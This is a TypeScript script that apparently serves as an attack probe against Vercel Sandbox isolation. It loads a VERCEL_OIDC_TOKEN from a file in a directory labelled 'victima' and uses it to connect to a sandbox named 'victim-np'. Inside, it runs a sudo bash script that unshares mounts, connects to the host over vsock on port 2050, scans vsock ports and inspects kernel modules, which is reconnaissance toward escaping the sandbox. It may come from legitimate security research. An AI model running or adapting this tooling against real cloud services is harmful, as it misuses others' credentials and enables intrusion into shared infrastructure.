import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== /dev/vsock? ==="
ls -la /dev/vsock 2>&1
echo "=== vsock port to CID3:2050 (python) ==="
timeout 8 python3 - <<'PYEOF'
import socket, time
try:
    s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((3, 2050))
    print("CONNECTED to vsock 3:2050", flush=True)
    # send an HTTP GET
    s.sendall(b"GET / HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n")
    try:
        d = s.recv(4096)
        print("resp:", d[:200], flush=True)
    except Exception as e:
        print("recv err:", e, flush=True)
    s.close()
except Exception as e:
    print("connect err:", e, flush=True)
PYEOF
echo "=== vsock ports scan (common) ==="
timeout 20 python3 - <<'PYEOF'
import socket
for port in [1,2,3,22,80,443,2000,2050,3000,4000,5000,8000,8080,9000,9090,10000,20500,30001,30002,30003,40000,50000,60000,65534]:
    try:
        s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
        s.settimeout(0.8)
        s.connect((3, port))
        print("OPEN vsock 3:"+str(port), flush=True)
        s.close()
    except Exception:
        pass
print("scan done")
PYEOF
echo "=== vsock from cid -1 (any)? ==="
timeout 5 python3 - <<'PYEOF'
import socket
try:
    s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((-1, 2050))
    print("connected to cid=-1 2050", flush=True)
    s.close()
except Exception as e:
    print("cid=-1 err:", e, flush=True)
PYEOF
echo "=== check hostname for virtsock/vsock ===="
cat /proc/modules 2>/dev/null | grep -i vsock
grep -ri vsock /etc/modprobe* /etc/modules* 2>/dev/null | head
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore22.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore22.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });